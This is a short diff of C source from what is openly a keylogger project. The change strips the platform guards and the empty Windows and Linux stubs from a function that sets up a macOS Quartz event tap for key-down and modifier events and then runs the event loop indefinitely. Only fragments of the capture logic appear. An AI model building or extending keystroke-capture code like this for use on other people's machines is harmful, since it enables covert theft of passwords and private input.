@@ -1,7 +1,6 @@
 #include "../include/keylogger.h"
 
 void getKeyStrokes() {
-#ifdef __APPLE__
     // Defines a mask that identifies the set of Quartz events to be observed in an event tap.
     CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
 
@@ -27,15 +26,6 @@ void getKeyStrokes() {
 
     //Runs the current thread’s CFRunLoop object in its default mode indefinitely.
     CFRunLoopRun();
-#endif
-
-#ifdef _WIN32
-    //Implement Windows key logger logic
-#endif
-
-#ifdef linux
-    //Implement Linux key logger logic
-#endif
 }
 
 // Called when event tap mask is satisfied.
